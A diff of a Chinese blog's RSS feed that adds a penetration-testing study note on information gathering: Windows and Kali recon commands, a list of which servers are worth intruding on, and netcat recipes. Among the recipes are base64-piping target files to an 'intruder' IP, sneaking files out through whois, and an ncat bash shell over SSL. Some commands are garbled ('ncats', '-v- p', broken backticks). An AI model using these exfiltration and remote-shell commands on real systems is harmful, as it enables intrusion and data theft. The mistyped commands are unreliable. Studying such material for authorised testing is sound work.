@@ -7,7 +7,96 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Sun, 23 Nov 2025 22:19:56 +0800</lastBuildDate><atom:link href="https://www.retr0.qzz.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 25 Nov 2025 10:56:43 +0800</lastBuildDate><atom:link href="https://www.retr0.qzz.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>1.3 信息搜集工具的使用</title>
+        <link>https://www.retr0.qzz.io/p/1.3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
+        <pubDate>Tue, 25 Nov 2025 10:56:43 +0800</pubDate>
+        
+        <guid>https://www.retr0.qzz.io/p/1.3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
+        <description>&lt;h2 id=&#34;信息搜集&#34;&gt;信息搜集
+&lt;/h2&gt;&lt;h3 id=&#34;本地信息搜集windows-命令&#34;&gt;本地信息搜集(Windows 命令)
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;			查看自己身份&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;whoami /all&lt;/code&gt;	获取当前域的信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ipconfig&lt;/code&gt;		获取ip地址信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ipconfig /all&lt;/code&gt;	获取详细的ip地址信息&lt;/p&gt;
+&lt;p&gt;查询结果：[所在域-计算机名-账户名]&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;arp -a&lt;/code&gt;			查询arp表&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo %PROCESSOR_ARCHITECTURE% &lt;/code&gt;	查看CPU架构&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;systeminfo&lt;/code&gt;		查看操作系统信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wmic product&lt;/code&gt;	查看安装的软件&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wmic product get name,version&lt;/code&gt;	查看安装的软件和版本信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net user&lt;/code&gt;		查看本地用户&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net session&lt;/code&gt;	查看本地和远程的会话&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net view&lt;/code&gt;		查看内网的共享情况&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net share&lt;/code&gt;		查看自己共享了哪些东西&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;远程信息搜集kali-命令&#34;&gt;远程信息搜集(Kali 命令)
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;什么样的服务器有入侵价值？&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;有有价值的网站&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;seo.chinaz.com  查看seo信息，权重，ip访问量&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;上面有庞大数据库的服务器&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;mssql mysql oracle redis&amp;hellip;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;性能优秀的服务器&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;高性能CPU，显卡，硬盘&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;保有某些单位机密的服务器&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;nping --tcp -p 80 --flag syn 2 [目标ip]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;测试对方端口是否开放&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc -nvz [目标ip] 1-65535&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用nc查看对方端口是否开放&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;netdiscover -i [网卡名称] -r 192.168.x.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;搜集内网用户的信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;arping [参数] [目标]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用arp扫描&lt;/p&gt;
+&lt;p&gt;-i 指定网卡&lt;/p&gt;
+&lt;p&gt;-c 发包数量&lt;/p&gt;
+&lt;p&gt;-s 源mac&lt;/p&gt;
+&lt;p&gt;-S 源ip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nbtscan&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用 netbios 协议进行信息搜集（Windows之间使用）&lt;/p&gt;
+&lt;p&gt;通过计算机名解析对应ip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;whatweb [网址]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;初步分析网站结构&lt;/p&gt;
+&lt;h2 id=&#34;nc用法追加&#34;&gt;nc用法追加
+&lt;/h2&gt;&lt;h4 id=&#34;文件传输常规&#34;&gt;文件传输（常规）
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;先启动发送&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;发送端：&lt;code&gt;nc -l -p [端口号] &amp;lt;文件&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接收端：&lt;code&gt;nc [发送端ip] [端口号] &amp;gt;文件&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;先启动接收&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;接收端：&lt;code&gt;nc -l -p [端口号] &amp;gt;文件&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发送端：&lt;code&gt;nc [发送端ip] [端口号] &amp;lt;文件&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;文本传输加密&#34;&gt;文本传输（加密）
+&lt;/h4&gt;&lt;p&gt;目标机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat [目标文件] | base64 | nc -nv [入侵机ip] [端口号] -q 1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;入侵机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc -l -p [端口号] &amp;gt;文件&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;文件传输两台都是linux且有一方没有nc&#34;&gt;文件传输（两台都是Linux且有一方没有nc）
+&lt;/h4&gt;&lt;p&gt;目标机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;whois -h [入侵机ip] -p [端口号] &lt;/code&gt;cat [文件] | base64``&lt;/p&gt;
+&lt;p&gt;入侵机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nc -l -v- p [端口号] | sed &amp;quot;s/ //g&amp;quot; | base64 -d&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;加密通信两台都是linux&#34;&gt;加密通信（两台都是Linux）
+&lt;/h4&gt;&lt;p&gt;使用&lt;strong&gt;ncat&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;目标机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ncat -c bash --all [入侵IP] -vnl [port] --ssl&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;入侵机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ncats -nv [目标IP] [port] --ssl&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>1.2 kali基础知识和指令及几个小工具</title>
         <link>https://www.retr0.qzz.io/p/1.2-kali%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7/</link>
         <pubDate>Sun, 23 Nov 2025 22:19:56 +0800</pubDate>
